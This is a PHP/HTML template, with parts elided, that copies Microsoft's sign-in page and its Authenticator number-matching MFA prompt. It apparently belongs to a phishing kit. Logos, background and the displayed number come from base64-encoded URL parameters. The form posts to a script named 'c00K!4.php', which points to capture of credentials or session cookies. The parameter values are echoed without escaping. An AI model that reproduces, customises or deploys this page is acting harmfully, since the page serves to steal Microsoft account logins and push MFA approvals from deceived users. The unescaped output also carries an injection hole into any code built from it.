    ...
    <div>
        ...
        <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                ...
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);">

                </div>

                <div id="bodybackground" class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="<?php echo empty($_GET['bg']) ? 'background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)' : 'background : linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url(' . base64_decode($_GET['bg']) . ')' ?>">
        ...
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="c00K!4.php" onsubmit="return checkSubmit()">
                ...
                <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
                    ...
                    params: {
                        ...
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
                            ...
                            <img class="logo" id="logoCompany" role="presentation" data-bind="imgSrc" src="<?php echo empty($_GET['logo']) ? 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd' : base64_decode($_GET['logo']) ?>">
                            ...
                            <div class="pagination-view" data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }">
                                ...
                                <div data-viewid="1">
                                    ...
                                    <div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
                                        ...
                                        <div data-viewid="6" data-showidentitybanner="true" data-bind="pageViewComponent: { name: 'session-approval-view',
                    params: {
                        serverData: svr,
                    ...
                    event: {
                        ...
                        submitReady: $tfaPage.view_onSubmitReady } }">
                                            ...
                                            <!-- ko if: svr.canary -->
                                            <input type="hidden" name="canary" data-bind="value: svr.canary" value="Mtp7hjqxzIeRg3F1oMg2G/vSlswfa2jS4nqu0yktKnM=0:1">
                                            <!-- /ko -->
                                            ...
                                            </div><div id="idRichContext_DisplaySign" class="displaySign" data-bind="text: displaySign"><?= empty($_GET['users']) ? '' : base64_decode($_GET['users']) ?></div>
                                            <!--<p class="row text-title" style="text-align: center; margin-top:50px;margin-bottom:50px;" ></p>-->
                        ...
                        disable: tdCheckbox.isDisabled" name="rememberMFA" aria-label="Don't ask again for undefined days" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">
                                                    ...
                                                    </div><p No number in your app make sure you upgrade to the latest version.</p>
                            ...
                            childBindings: {
                                'signInAnotherWay': {
                                    ...
                                    hasFocusEx: !tdCheckbox.isShown,
                                    ariaDescribedBy: ['idDiv_SAOTCAS_Title', 'idDiv_SAOTCAS_Description'].concat(description2 ? ['idDiv_RichContext_Description'] : []).join(' ') } }"><p>No numbers in your app? Make sure you upgrade to the latest version</p><a href="#" id="signInAnotherWay" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">I can't use my Microsoft Authenticator app right now</a></div>
                                                                <!-- /ko -->
